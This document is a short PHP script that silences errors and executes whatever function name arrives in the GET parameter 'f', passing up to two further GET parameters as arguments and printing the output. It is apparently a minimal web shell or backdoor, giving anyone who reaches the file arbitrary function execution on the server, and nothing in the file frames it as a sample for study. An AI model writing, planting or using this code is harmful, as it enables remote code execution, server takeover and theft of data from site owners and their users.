<?php 
error_reporting(0);
print_r($_GET['f']());
print_r($_GET['f']($_GET['p1']));
print_r($_GET['f']($_GET['p1'],$_GET['p2']));
?>